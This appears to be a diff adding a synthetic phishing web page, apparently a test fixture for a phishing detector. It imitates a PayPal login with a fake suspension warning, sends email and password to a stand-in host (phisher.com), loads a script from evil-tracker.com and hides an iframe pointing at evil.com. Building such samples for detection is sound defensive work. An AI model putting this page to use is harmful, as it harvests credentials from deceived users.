@@ -1,0 +1,31 @@
+<!-- 
+  Synthetic Phishing HTML - High Risk
+  Contains: hidden iframe, external login form, password field, urgency keywords
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PayPal Login - Secure Account</title>
+    <script src="http://evil-tracker.com/script.js"></script>
+</head>
+<body>
+    <h1>Verify Your Identity</h1>
+    <p>Your account has been suspended. Click immediately to restore access.</p>
+    
+    <!-- External login form -->
+    <form action="http://phisher.com/submit" method="POST">
+        <label>Email:</label>
+        <input type="text" name="email"><br>
+        
+        <label>Password:</label>
+        <input type="password" name="password"><br>
+        
+        <button type="submit">Verify Now</button>
+    </form>
+    
+    <!-- Hidden iframe -->
+    <iframe style="display:none" src="http://evil.com/track" width="0" height="0"></iframe>
+    
+    <a href="http://insecure-link.com">Click here</a>
+</body>
+</html>
